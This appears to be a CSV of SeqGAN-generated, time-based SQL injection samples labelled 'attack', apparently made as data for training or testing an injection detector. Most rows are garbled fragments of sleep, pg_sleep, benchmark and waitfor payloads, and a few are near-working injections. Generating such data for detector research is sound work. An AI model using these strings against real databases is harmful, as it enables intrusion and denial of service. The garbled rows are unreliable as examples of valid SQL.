label,payload,family,payload_type,method,run_id,sample_index
attack,"select "" 6969 6969 from * e   (  select * from   (  select  (  5   <> e,(   (  5  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,334
attack, 4240 from '0:0:5' 'yfvu' e 6383md5  )  )   and   (  select (  (  sleep  (  5    )    )     )   'rnzp'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,335
attack,"vh"" like ""lp)""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,336
attack,"1%"" or 6793 from where 1679 from   (  0x76555642   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,337
attack,1'+  (  select 'ddkxikj,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,338
attack,1 where 7196  =  8252 or     8466  =  6866  sleep  (  5   <> 3824  =  benchmark  (  =  7196 sleep  (  sleep  (  5   )    (     (  select 8594 from  from   (  5   )    )    <> e 2388  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,339
attack,"select    (  (  select * from   (    (  =  benchmark   (    (  select 6969 from from   (  select  (  sleep  s  =    ( q or 4240  5000000,md:=  select 6793 from pg_sleep  (  5   or   (  select or 4240  =    (    (     (  select 6793 from pg_sleep  (  (  5   )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,340
attack,1 where e   (  0x544d5a4c   )  rusddh --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,341
attack,select waitfor (  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,342
attack,select sleep  5  )   and    (   5874    =  6272ft    ru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,343
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chv where 4683   '%'  =    (  select 8594 from pg_sleep  (  5   and    (    and    (  select or elt  (  (  5   )    )     )   and        (     (  select sleep  (  6383 from pg_sleep  (  5   )  ""%""  (  =  '   )    )     )  sddo   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,344
attack,5   'fegp'  =    (     select 6793 from from pg_sleep  (  0x544d5a4c   or 4240  =    (  select * from   (  select  (  sleep  (  5   )    )     )     )     )    rs e from   (  select 6793 from pg_sleep  (  (  5   )    )     )   (  select 8594 from  '0:0:5'#,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,345
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'rn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,346
attack,"  6272  9649u where or from   (    ( sleep  5000000,md5  (  5   )    seruaqlike   )     )   and   (  =    (  select 4240 from from   (  select  (  5  )   -- kvxipet  (  =  6272,sleep  (  (  5   )    (    )     )e)   #zvq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,347
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'rswjyd     pg_sleep  (  select from pg_sleep  (  benchmark  (  5   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,348
attack,"1 and   (    (  5   )   <> 'sa' k_mdo  )  #=  and    (  '%'  =    (  select * from   (    (  ""uvzc"" pg_sleep  ""%""  =    (     )  sddo  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,349
attack,select sleep  (  (  5   )     )  sddo  =  'fegp'  2044 ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,350
attack,"select ""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,351
attack,"select "" or el  )   or 8514  =  7196  (  sleep  (     (  5000000   (  select * from   (  select  (  (  sleep  (  =  (  select sleep  (  5000000,md5  (  ""zlal""  (  =  benchmark  (  =  benchmark  (  0x544d5a4c   and from from   (  0x76555642   )    e where from   (  select  (  5000000,md5  (  5   )    and 8594  =    (     (  select from 4240 sleep  (  5  )   (  =  6866",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,352
attack,"select benchmark  (  1210  ( or from   (  select  (  1210  (  sleep  0x694a4745   (select * from pg_sleep  (  5000000,md5  (  5000000,md5  =  (  5   )    )    rldomi '0:0:2' and 8514  =  7196  (  5   )    )    )   'rnzp'  =    (    (    (pe from 6969 from pg_sleep  (  5   )    )    rlt  5874",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,353
attack,select    )     )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,354
attack,",0x4c4d6142   or like from where 3824  =  1679 f waitfor 4240  =  sleep  (  5   )    r6969 8507  =    (  ""%""  =     from pg_sleep  (  5   )     #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,355
attack,1mdp rlike   (    (  v,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,356
attack," * pg_sleep  (  5000000,md5  (  (  0x4c4d6142   )    and    (     (  select * from   (  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,357
attack,1 or 8514  =  7196 or 6793  =    (  5  )     )   se from pg_sleep  (    (  select or 8466  =  benchmark  (  sleep  (  sleep  (  5   )    )     )  sdd fromwjyq  )rmy  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,358
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvtux y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,359
attack,"1"" where pg_sleep  (  5000000,md5  (  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,360
attack,"1 where   =  (  1210  =  "" 8507  =  (  =  (  =  (  3114  (  =  8507 y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,361
attack,1 and   (  select pg_sleep  (  select  (  sleep  (  5   )    )     )    )    (  select * from   (  select  (  5   )     )   and=    (    (     (  1915  =  =    nzq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,362
attack,1 where 2841  =  '%'  (  sleep  ( * from   (  =  7021 or sleep  (  =  (  =  2841 or 3824  6272  =  from from   (  sleep  (  select 6793 from pg_sleep  (  5   )    )rasd kky,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,363
attack,select k  (  5   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,364
attack,1 and 4240  =  'rt * (  1210select from pg_sleep  (  )  (  select  (  sleep   (  0x4c4d6142   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,365
attack,"1 where 6175  =  2044 benchmark  )  6272,sleep (  5  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,366
attack,1 or(  select (  (  5   )     )     )     )    )    and    (     (    (  select 6969 from pg_sleep  (  0x544d5a4c   (  select    (  select g  benchmark  (  5     (    (    (  =    (  select * from   (  select  (  sleep  (  5   )    asegcvt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,367
attack,"1"" pg_sleep  '%' 5874  =    and   (  =    (he or 8466  =  benchmark  (  5   )    and    (  select 8594 from pg_sleep  (  5   )    )    )   1679 like from where (  =  5000000,mdmd5  (  5   )    )     )  syuike%from ,md  =  0x4c4d6142  sormdo  )   rusu) and    (     (     (      )     )  (  select * from from pg_sleep  (  5000000,md5  (  (  5   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,368
attack,1zoin'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,369
attack,select 5   )    and et4240 from pg_sleep  (    (  select * from   (  0x76555642   # fu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,370
attack,1 or 4240  =    (     'rnzp'  =    (  select 6969 from from   =  select 6969 pg_sleep  1210(  0x544d5a4c   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,371
attack,"select sleep  (  sleep  (  5   )    and    and   (yfM<>aq 'sa' elt  =  (  =  (  =  benchmark  (  2044  (  5   )    )     rliq  )      )     )   -- kfselect from pg_sleep  (  5   (  (  select like  (  1210,sleep  (  6272  (  sleep  (  5   )    # like ""wuq)  )   and    (    (  sdd5  )    (     (  0x4c4d6142   )     )  semdk  =  benchmark  (  select    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,372
attack,"1"" or 6793  =    (f  0x4c4d6142   )    )     )  sdke' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '   (  select from pg_sleep  =  5   and    (    (  select 6969 from   'rnzp'  =1  benchmark     (  =    (  5   )    )    )     )  (    (     (      (  select or 6793  =  5874    (    (  )  v kselect from from pg_sleep  (  sleep  (  5000000,md5  (  5   )    )     )   (  5000000,md5  5   )    )    and   (  select 6969 from   (  selectwaitfor",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,373
attack,"select pg_sleep  (  5000000,md5  (  5   )     )rrlie     )     )    )     )    as do  )   where '0:0:5' 2388  =  8667 or 4240  =  6383 --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,374
attack,1 or   (  =     (  select 6969 from where pg_sleep  (  5   )     )eru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,375
attack,mdhmd '#,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,376
attack,"1'+  (  select 'dkk""eruviq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,377
attack,"     (  '%'  )   and    (    (    (    (     (  0x544d5a4c   )    )     )   sgvq where or from   2239  (  select 4240 from 4240 from from   (  sleep  (  1210  =  (  1210,sleep  )   (  select * pg_sleep  (  5   )    )     )    )     )    rldo from y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,378
attack,select   =  # * from   (  =  5000000waitfor g  5   )    and    (   0x76555642   #w where '0:0:2' 8667   (  =  benchmark  (  5   )     )  (  select and from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,379
attack,  =     (  select from   (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,380
attack,     )   (     (   'wyvx'  =  1568zu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,381
attack,"select benchmark or 4240from   where,md5  (  5   )    )     )   and    (    (  1915  =  ""wuq and   (    (  1915  =  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,382
attack,"select benchmark  (  5000000,md5  (  5   )     (  ""zlal""  =  =  benchmark  (  5   )    )     )  sddo  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,383
attack,"select benchmark  (  5   )        (  select * pg_sleep  (  5 or 6969 e from pg_sleep  (  select 4240 from from   (  ""%""  6272  =  3114  =  (  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,384
attack, ' and    (    (     (  ' kd5  (  select 6793 from from pg_sleep  (  5   )     )  sdd5  sddo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,385
attack,select sleep  (  (  5   )    and    (    (     (  select * from   (  select  (  sleep  (  sleep  (  5   )    )     )s)  -- ffpdke6967 from pg_sleep  (  5   )     )   )    )    as kydo  ) rmdo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,386
attack,"1 or sdiqewke   (  0x6d457153     )    )   -- e from from   as bddpu  )    w  )  )    and 6793  =    (  =  select from ,md5  (  5   )      and    (     (  select * from pg_sleep  (  5   )     )   and       ""uvzc"" emd5  (  5  ))  ruu",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,387
attack,""" ""wyu  select * from from   (  sleep  (  5000000,md5  (  5000000,md5  (  (  select  (  5   and    (    (  "" select 6969 '0:0:5'#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,388
attack,1   (  select 6793 from pg_sleep  (  6967 or 8514  (  =  benchmark  (  5   and    (  select 6793 from where from   )    (  select * from   (  5  sde from from from   (  sleep  select  (  5   )    and        (  select 8594  =  7021 (  select 8594 from pg_sleep  (  5  )   and   (  select 6969 from   (    (  sdd5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,389
attack,"1""   )    )   and   'fegp'  =    (  )  #z",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,390
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'hs,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,391
attack,1'||  (  select 'oxdin'  =  '   xlmp  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,392
attack,select benchmark  (  5   )     )   )    )     )   )        as,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,393
attack,"1'r  )   and       (  select 4240 from pg_sleep  (  5000000,md5  (  select  ( waitfor ((  (  select and from   (  select 1679  =  (  0x76555642   )     )  sddo  =  '  =    (     (  6175  )rsxdo  )    r and    (     (  select    (  =  select 4240 from or from   (  select sleep  (  sleep  (  5  e   (yqvwyq    (  select delay 8514  6272,sleep  (  (  5   )     )        ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,394
attack,"pdke from pg_sleep(  (  select   (  select 8514  =    (  5000000,md5  0x694a4745   )     )rr 8466  =  'fq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,395
attack,1 or 8466  =  (  5   )    )     )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,396
attack,"1""    (  select * from   (  5  sdd5  )  #zc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,397
attack, 8252 or 6793  =  0x694a4745   )    )     )  5874,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,398
